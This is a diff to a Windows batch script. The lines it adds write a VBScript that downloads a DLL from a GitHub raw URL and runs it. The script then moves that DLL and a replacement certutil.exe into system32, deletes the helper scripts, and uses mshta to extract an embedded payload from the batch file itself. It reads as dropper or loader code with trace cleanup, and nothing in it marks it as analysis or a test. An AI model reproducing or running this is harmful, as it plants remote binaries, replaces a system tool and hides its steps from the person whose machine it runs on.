@@ -23,9 +23,28 @@ echo Set oXMLHTTP = Nothing>>crt.vbs
 echo Set oADOStream = Nothing>>crt.vbs
 ping 127.0.0.1 -n 1
 crt.vbs
+echo InetFile = "https://raw.githubusercontent.com/paolosezart/protor/master/certadmXP.dll">crtdll.vbs
+echo localFile = "%windir%\addins\certadmXP.dll">>crtdll.vbs
+echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")>>crtdll.vbs
+echo oXMLHTTP.Open "GET", InetFile, 0 >>crtdll.vbs
+echo oXMLHTTP.Send>>crtdll.vbs
+echo Set oADOStream = CreateObject("ADODB.Stream")>>crtdll.vbs
+echo oADOStream.Mode = 3 >>crtdll.vbs
+echo oADOStream.Type = 1 >>crtdll.vbs
+echo oADOStream.Open>>crtdll.vbs
+echo oADOStream.Write oXMLHTTP.responseBody>>crtdll.vbs
+echo oADOStream.SaveToFile localFile, 2 >>crtdll.vbs
+echo Set oXMLHTTP = Nothing>>crtdll.vbs
+echo Set oADOStream = Nothing>>crtdll.vbs
+ping 127.0.0.1 -n 1
+crtdll.vbs
 ping 127.0.0.1 -n 8
 move /Y certutilxp.exe %windir%\system32\certutil.exe
+move /Y certadmXP.dll %windir%\system32\certadmXP.dll
 del /f /q crt.vbs
+del /f /q crtdll.vbs
+
+
 :decode
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"Procx.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
